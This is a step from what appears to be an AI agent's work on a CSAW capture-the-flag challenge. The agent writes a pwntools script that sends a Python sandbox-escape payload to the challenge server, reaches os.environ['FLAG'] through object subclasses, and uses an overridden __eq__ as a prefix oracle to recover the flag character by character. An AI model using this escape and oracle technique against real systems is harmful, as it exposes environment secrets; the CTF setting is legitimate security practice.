I’ll write a pwntools script that performs a prefix oracle attack against `os.environ['FLAG']`, using the success message as the yes/no signal.

COMMAND
edit 1:1
from pwn import remote

HOST = "misc.chal.csaw.io"
PORT = 9998

alphabet = "flag{}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!-@#$%^&*()_+=:;,.?/<>[]\\|`~"

def good(prefix):
    r = remote(HOST, PORT)
    r.recvuntil(b">  ")
    payload = (
        "type('X',(),{'__eq__':lambda s,o:"
        + repr(prefix)
        + "==[c for c in (()).__class__.__base__.__subclasses__() if c.__name__=='catch_warnings'][0].__init__.__globals__['sys'].modules['os'].environ['FLAG'][:"
        + str(len(prefix))
        + "]})()"
    )
    r.sendline(payload.encode())
    data = r.recvall(timeout=2)
    r.close()
    return b"Guess game end!!!" in data

flag = "flag{"
while not flag.endswith("}"):
    found = False
    for ch in alphabet:
        cand = flag + ch
        print("trying", cand, flush=True)
        if good(cand):
            flag = cand
            print("hit", flag, flush=True)
            found = True
            break
    if not found:
        print("stuck at", flag)
        break

print(flag)
end_of_edit
